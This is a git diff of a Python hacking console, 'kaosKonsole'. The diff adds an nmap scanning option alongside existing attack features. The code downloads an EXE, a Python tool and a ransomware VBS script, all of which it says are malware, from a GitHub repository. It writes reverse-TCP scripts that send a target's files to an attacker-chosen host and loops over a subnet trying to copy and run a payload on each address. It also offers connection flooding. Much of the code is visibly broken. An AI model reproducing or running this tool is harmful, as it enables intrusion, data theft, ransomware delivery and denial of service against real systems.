@@ -1,16 +1,24 @@
 import os
+import nmap
 import socket
 import requests
+import platform
 from bs4 import BeautifulSoup
 import shutil
 import subprocess
 import urllib.request
 import time
 
+jani09 = platform.system()
+
 defaultpath = os.path.abspath(__file__)
 
-os.system("title kaosKonsole")
-os.system("color 04")
+if jani09 == "Windows":
+    os.system("title kaosKonsoleBerryBlast")
+    os.system("color 04")
+elif jani09 == "Linux":
+    os.system("title kaosKonsoleLimeo")
+    os.system("color 04")
 while True:  
     print("___________________________________________________________________")
     print("                            _    _                                 ")
@@ -19,6 +27,8 @@ while True:
     print("  /(     /   ) /   ) (_ ` /  \     /   ) /   ) (_ ` /   ) /   /___)")
     print("_/___\__(___(_(___/_(__)_/____\___(___/_/___/_(__)_(___/_/___(___ _")
 
+    print("OS: " + jani09)
+
     print(time.localtime)
     print(time.ctime)
     print(time.mktime)
@@ -26,7 +36,7 @@ while True:
     print("universal: " + time.gmtime)
     print("perf: " + time.perf_counter)
 
-    print("Connect to IP + Port: c")
+    print("Exploit: e")
     print("Sniff connections within a range: sniff")
     print("Sniff IP + Port status: pingsniff")
     print("Flood IP + Port with connections: flood")
@@ -34,138 +44,163 @@ while True:
     print("Use pingo: pingo")
     print("Social engineering: soc")
                                                                    
-    x1 = input("Choose command: ")
-    if x1 == "c":
+    x1 = input("command: ")
+    if x1 == "e":
         print("wowza")
+        print("available:")
+        print("nmap")
+        print("bruteforce")
+        uri9 = input("command: ")
         p65 = input("Select an IP: ")
         f34 = int(input("Select da port: "))
-
-        try:
-            socket.create_connection((p65, f34))
-            print(str(p65) + ":" + str(f34) + " :3")
-            print("exploit")
+        if uri9 == "nmap":
+            try:
+                mike4 = input("nmap arguments: ")
+                print("universal: " + time.gmtime)
+                print("perf: " + time.perf_counter)
+                print("Starting nmap scan on: " + p65)
+                print("Arguments: " + mike4)
+                suli0 = nmap.PortScanner()
+                suli0.scan(p65, arguments="-O")
+                ja1 = suli0[p65]['osmatch'][0]
+                print("^^ " + ja1['name'], ja1['accuracy'])
+                suli0.scan(p65, arguments=mike4)
+            except:
+                print("@w@ " + p65)
+            print("continue")
             print("getmeout")
-            r43 = input("What now: ")
-            if r43 == "exploit":
-                print("how to exploit??")
-                print("warning this will download some malwares if ur a fucking scrub maybe its not too safe to utilize some of these")
-                xb = input("exploit: ")
-                if xb == "infarox27":
+            nancy76 = input("what now: ")
+            if nancy76 == "continue":
+                continue
+            elif nancy76 == "getmeout":
+                break
+        elif uri9 == "bruteforce":
+            try:
+                socket.create_connection((p65, f34))
+                print(str(p65) + ":" + str(f34) + " :3")
+                print("exploit")
+                print("getmeout")
+                r43 = input("What now: ")
+                if r43 == "exploit":
+                    print("how to exploit??")
+                    print("warning this will download some malwares if ur a fucking scrub maybe its not too safe to utilize some of these")
+                    xb = input("exploit: ")
+                    if xb == "infarox27":
 
-                    print("based")
-                    print("downloading infarox..")
+                        print("based")
+                        print("downloading infarox..")
 
-                    url = "https://github.com/kaosSec/kaosTools/raw/main/infarox/infarox27/infarox27.EXE"
-                    filename = defaultpath + "\\" + "infarox27.EXE"
-                    urllib.request.urlretrieve(url, filename)
+                        url = "https://github.com/kaosSec/kaosTools/raw/main/infarox/infarox27/infarox27.EXE"
+                        filename = defaultpath + "\\" + "infarox27.EXE"
+                        urllib.request.urlretrieve(url, filename)
 
-                    copied_file_path = os.path.join(defaultpath + "\\" + filename)
-                    continue
-                elif xb == "MSS":
-                    
-                    print("$$$$")
-                    print("downloading MSS..")
+                        copied_file_path = os.path.join(defaultpath + "\\" + filename)
+                        continue
+                    elif xb == "MSS":
+                        
+                        print("$$$$")
+                        print("downloading MSS..")
 
-                    url = "https://github.com/kaosSec/kaosTools/raw/main/py/MSS.py"
-                    filename = defaultpath + "\\" + "MSS.py"
-                    urllib.request.urlretrieve(url, filename)
+                        url = "https://github.com/kaosSec/kaosTools/raw/main/py/MSS.py"
+                        filename = defaultpath + "\\" + "MSS.py"
+                        urllib.request.urlretrieve(url, filename)
 
-                    copied_file_path = os.path.join(defaultpath + "\\" + filename)
-                    continue
-                elif xb == "PlorgBetterRansom":
+                        copied_file_path = os.path.join(defaultpath + "\\" + filename)
+                        continue
+                    elif xb == "PlorgBetterRansom":
 
-                    print("thats rude")
-                    print("downloading PlorgBetterRansom..")
+                        print("thats rude")
+                        print("downloading PlorgBetterRansom..")
 
-                    url = "https://github.com/kaosSec/kaosTools/raw/main/luvzmiscvbs/PlorgBetterRansom.vbs"
-                    filename = defaultpath + "\\" + "Plorg.vbs"
-                    urllib.request.urlretrieve(url, filename)
+                        url = "https://github.com/kaosSec/kaosTools/raw/main/luvzmiscvbs/PlorgBetterRansom.vbs"
+                        filename = defaultpath + "\\" + "Plorg.vbs"
+                        urllib.request.urlretrieve(url, filename)
 
-                    copied_fule_path = os.path.join(defaultpath + "\\" + filename)
-                    continue
-
-                elif xb == "reverseTCP":
-
-                    print("basic yawwwwwwn butyea")
-                    print("Creating files..")
-                    
-                    jj78 = input("Enter local address: ")
-                    m89 = input("Enter local port: ")
-                    k34 = input("Enter data to send to target: ")
-                    o57 = input("Extension for data saved to target: ")
-                    riga70 = input("File to receive from target: ")
-
-                    with open("localTCP.py", "w") as f:
-                        w = f.write
-
-                        w("sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")
-
-                        w(f"server_address = ({jj78}, {m89})")
-                        w("sock.bind(server_address)")
-
-                        w("sock.listen(1)")
-
-                        w("while True:")
-                        w("    connection, client_address = sock.accept()")
-                        w("    try:")
-                                
-                        w("        data = connection.recv(1024)")
-                        w(f"        message = {k34}")
-                        w("        connection.sendall(message.encode())")
-                        w("    except:")
-                        w("        print("@w@")")
-                        w("        continue")
-                        w("    finally:")
-                        w("        connection.close()")
-                        os.system("python localTCP.py")
-                    with open("uji67.py", "w") as f:
-                        w = f.write
-
-                        w(f"with open({riga70}, 'rb') as f:")
-                        w(f"    {riga70} = f.read()")
-
-                        w("sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")
-
-                        w(f"server_address = ({jj78}, {m89})")
-                        w("sock.connect(server_address)")
-
-                        w("try:")
-                        w(f"    message = str(os.system) + {riga70}")
-                        w("    sock.sendall(message.encode())")
-
-                        w("    data = sock.recv(1024)")
-                        w("    print(f"'{data.decode()}'")")
-                        w(f"    with open('runky.' + {o57}, 'w') as f:")
-                        w("        f.write(data.decode())")
-                            
-
-                        w("finally:")
-                        w("    sock.close()")
-
-                        filename = "uji67.py"
-
+                        copied_fule_path = os.path.join(defaultpath + "\\" + filename)
                         continue
 
-                # pwn nubz
-                for i in range(1, 256):
-                    try:
-                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        s.connect(p65 + str(i))
-                        shutil.copy2(filename, p65)
-                        subprocess.run(['python3', '{}/{}'.format(p65, os.path.basename(filename))])
-                        print(str(p65) + ":" + str(i) + ":" + str(f34) + " ^^")
+                    elif xb == "reverseTCP":
+
+                        print("basic yawwwwwwn butyea")
+                        print("Creating files..")
                         
-                    except:
-                        print(str(p65) + ":" + str(i) + ":" + str(f34) + " @w@")
-                        pass
-                
-            elif r43 == "getmeout":
-                exit
-            else:
-                print("what")
-                exit
-        except:
-            print(str(p65) + " :/")
+                        jj78 = input("Enter local address: ")
+                        m89 = input("Enter local port: ")
+                        k34 = input("Enter data to send to target: ")
+                        o57 = input("Extension for data saved to target: ")
+                        riga70 = input("File to receive from target: ")
+
+                        with open("localTCP.py", "w") as f:
+                            w = f.write
+
+                            w("sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")
+
+                            w(f"server_address = ({jj78}, {m89})")
+                            w("sock.bind(server_address)")
+
+                            w("sock.listen(1)")
+
+                            w("while True:")
+                            w("    connection, client_address = sock.accept()")
+                            w("    try:")
+                                    
+                            w("        data = connection.recv(1024)")
+                            w(f"        message = {k34}")
+                            w("        connection.sendall(message.encode())")
+                            w("    except:")
+                            w("        print("@w@")")
+                            w("        continue")
+                            w("    finally:")
+                            w("        connection.close()")
+                            os.system("python localTCP.py")
+                        with open("uji67.py", "w") as f:
+                            w = f.write
+
+                            w(f"with open({riga70}, 'rb') as f:")
+                            w(f"    {riga70} = f.read()")
+
+                            w("sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")
+
+                            w(f"server_address = ({jj78}, {m89})")
+                            w("sock.connect(server_address)")
+
+                            w("try:")
+                            w(f"    message = str(os.system) + {riga70}")
+                            w("    sock.sendall(message.encode())")
+
+                            w("    data = sock.recv(1024)")
+                            w("    print(f"'{data.decode()}'")")
+                            w(f"    with open('runky.' + {o57}, 'w') as f:")
+                            w("        f.write(data.decode())")
+                                
+
+                            w("finally:")
+                            w("    sock.close()")
+
+                            filename = "uji67.py"
+
+                            continue
+
+                    # pwn nubz
+                    for i in range(1, 256):
+                        try:
+                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                            s.connect(p65 + str(i))
+                            shutil.copy2(filename, p65)
+                            subprocess.run(['python3', '{}/{}'.format(p65, os.path.basename(filename))])
+                            print(str(p65) + ":" + str(i) + ":" + str(f34) + " ^^")
+                            
+                        except:
+                            print(str(p65) + ":" + str(i) + ":" + str(f34) + " @w@")
+                            pass
+                    
+                elif r43 == "getmeout":
+                    exit
+                else:
+                    print("what")
+                    exit
+            except:
+                print(str(p65) + " :/")
 
     elif x1 == "flood":
         stop = False
@@ -285,9 +320,14 @@ while True:
             break
 
     elif x1 == "soc":
-        os.system("cls")
-        os.system("color 03")
-        os.system("title evileye")
+        if jani09 == "Windows":
+            os.system("cls")
+            os.system("color 03")
+            os.system("title evileye")
+        elif jani09 == "Linux":
+            os.system("cls")
+            os.system("color 03")
+            os.system("title evileye")
         print("                             ▒▒▒▒▓▓▒▒▒▒▓▓▒▒░░                         ")
         print("                      ▓▓▒▒▒▒▒▒░░▓▓░░▒▒▒▒░░▓▓▓▓▒▒▓▓                    ")
         print("                  ░░░░░░░░▒▒    ▒▒  ░░    ░░▒▒▒▒▒▒▓▓▒▒░░              ")
